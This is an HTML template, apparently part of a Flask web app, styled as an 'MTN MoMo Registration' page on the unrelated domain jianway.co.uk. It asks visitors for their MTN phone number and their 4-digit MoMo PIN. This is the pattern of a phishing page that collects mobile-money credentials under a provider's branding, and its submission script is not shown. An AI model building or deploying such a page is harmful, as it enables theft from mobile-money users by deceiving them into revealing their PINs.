<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MTN MoMo Registration</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="header">
                <!-- Logo with fallback -->
                <img src="{{ url_for('static', filename='../images/logo.png') }}" 
                     alt="Logo" 
                     class="logo"
                     onerror="this.style.display='none'">
                <h1>jianway.co.uk</h1>
            </div>
            
            <form id="registrationForm" class="registration-form">
                <div class="input-group">
                    <label for="mtnNumber">MTN NUMBER</label>
                    <input 
                        type="tel" 
                        id="mtnNumber" 
                        name="mtn_number" 
                        placeholder="Enter MTN number" 
                        required
                        pattern="[0-9\s\+]{10,15}"
                        maxlength="15"
                    >
                </div>
                
                <div class="input-group">
                    <label for="momoPin">MOMO PIN</label>
                    <input 
                        type="password" 
                        id="momoPin" 
                        name="momo_pin" 
                        placeholder="Enter 4-digit PIN" 
                        required
                        pattern="[0-9]{4}"
                        maxlength="4"
                        minlength="4"
                    >
                    <span class="toggle-pin" onclick="togglePinVisibility()">👁️</span>
                </div>
                
                <button type="submit" class="register-btn">REGISTER</button>
            </form>
            
            <div id="messageContainer" class="message-container"></div>
            
            <!-- Footer image -->
            <div class="footer-image">
                <img src="{{ url_for('static', filename='../images/screenshot.png') }}" 
                     alt="Screenshot" 
                     class="screenshot"
                     onerror="this.style.display='none'">
            </div>
        </div>
    </div>
    
    <script src="{{ url_for('static', filename='script.js') }}"></script>
</body>
</html>
